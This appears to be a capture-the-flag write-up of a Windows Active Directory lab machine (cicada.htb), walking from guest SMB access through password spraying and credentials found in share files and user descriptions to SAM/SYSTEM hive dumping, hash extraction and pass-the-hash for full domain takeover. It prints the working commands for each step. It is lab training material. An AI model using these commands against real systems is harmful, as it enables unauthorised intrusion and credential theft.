
**OS:** Windows  
**Date:** 26th of August 2026
## Executive summary

In this box, we were able to get initial credentials by accessing a share that was accessible by the Guest user. This revealed the default password which was attempted against all the users. The users were also accessible via the Guest user account. User michael.wrightson had the default password and he also had access to  RPC and by quering the service, user david.orelious had stored their password within the description. david.orelious had access to the DEV share, which had a backup script including credentials for emily.oscars as well. emily.oscars could use the windows remote management service, which means she was able to get terminal access against the domain. She also had the the privileges "SeBackupPrivilege" and "SeRestorePrivilege". These are dangerous to have together as this user is able to download all the hashes from the domain into a file via the terminal and then offload it onto the attacker machine where administrative access could be extracted from. After the administrative hash was fetched, the whole domain was compromised as this administrator was inside the Domain Admins group.


## Enumeration
Our initial scans yields these open ports at the target host:

![](Images/Pasted%20image%2020260826121909.png)

First we attempt to check some low-hanging fruits by trying anonymous/guest smb, rpc and ldap.

We are able to authenticate with rpc, but we do not have rights to get users. Ldap is configured the same way, but over SMB we get access to the HR share, which is non-standard.
```
netexec smb $target -u 'Guest' -p '' --shares
```

![](Images/Pasted%20image%2020260826093259.png)

We note that the domain name is cicada.htb as well and put it in /etc/hosts.
Since we want usernames, we attempt to read it.
```
smbclient -U Guest //$target/HR
```

![](Images/Pasted%20image%2020260826105303.png)

We fetch the note from HR and see that it contains default credentials.

![](Images/Pasted%20image%2020260826105400.png)

Since we have default credentials, we want to attempt password spraying once we get usernames.
Since the guest user did authenticate to smb, we can attempt rid brute, which works. So we do it again to get a userlist directly into users.txt:
```
netexec smb $target -u 'Guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '' -f2 | tee users.txt
```

![](Images/Pasted%20image%2020260826110036.png)

We replace CICADA\ with nothing and we attempt password spraying:
```
netexec smb $target -u users.txt -p '******' --continue-on-success
```


![](Images/Skjermbilde%202026-08-26%20110225.png)

And sure enough, we are able to authenticate with the michael.wrightson user.
## Exploitation
We can now attempt to enumerate services, start bloodhound, kerberoast or asreproast since we have not done that yet. We start with asrepraost, which fails as does Kerberoasting. We also check winrm, but this user does not have access to that. We go on to set up Bloodhound by first requesting the file:
```
sudo netexec ldap $target -u USERNAME -p 'PW' --bloodhound --collection All --dns-server $target
```
Get docker file
```
curl -L https://ghst.ly/getbhce -o docker-compose.yml
```
Start it
```
sudo docker-compose pull && sudo docker-compose up -d
```
Then, get the password as admin user:
```
sudo docker-compose logs bloodhound | grep -i passw
```

then go to <http://127.0.0.1:8080> with user admin and password u got from the grep.

We then ingest the file and add michael.wrightson to owned:

![](Images/Pasted%20image%2020260826111725.png)

Bloodhound does not show any interesting paths forward, so we enumerate further.
We look at the RPC service and attempt enumdomusers, which reveals credentials in the description for user david.orelious:

![](Images/Pasted%20image%2020260826112757.png)

To be thorough, we attempt spraying here as well, in case this password is shares by others. 

![](Images/Pasted%20image%2020260826112938.png)

It isn't, but we validated that david.orelious has this password. We set him as owned in Bloodhound and see if we have a path forward. He does not have access to winrm, but he does have read access to the DEV share. We attempt to access it:

![](Images/Pasted%20image%2020260826113446.png)

We fetch the file and look what is in there.
It contains credentials for emily.oscard:

![](Images/Pasted%20image%2020260826113555.png)

Now, let's attempt to authenticate with her.
We are able to authenticate to winrm with shell, so we attempt to spawn one:

![](Images/Pasted%20image%2020260826115047.png)

We are able to do it. We set her to owned in Bloodhound and look for privelege escalation now.

We check her groups, user info and privileges first with
```
whoami /all
```

![](Images/Pasted%20image%2020260826121747.png)

 and sure enough she has SeRestorePrivilege and SeBackupprivilege, which are dangerous permissions to have together.
 
## Post-Exploitation (Privilege Escalation)
Since we now have a likely path to Administrator, we start setting up the attack:

`mkdir temp` and go into it (C:\\temp)
we then copy from the registry which results in the sam file and:
```
reg save hklm\sam c:\Temp\sam
```
and then get the system file:
```
reg save hklm\system c:\Temp\system
```
Now we exfriltrate these files by running - It will arrive in the folder where our attacker spawned the shell from:
```
download system
```

```
download sam
```

![](Images/Pasted%20image%2020260826120219.png)

On the attacker machine, we now run:
```
impacket-secretsdump -sam sam -system system local
```

![](Images/Pasted%20image%2020260826120250.png)

It outputs the Administrative nthash which we can use as a pass-the-hash attack.
No need to dilly dally, we attempt it right away:

```
evil-winrm -u Administrator -H ****** -i $target
```

![](Images/Pasted%20image%2020260826120548.png)

And sure enough it works, resulting in complete Domain compromise.







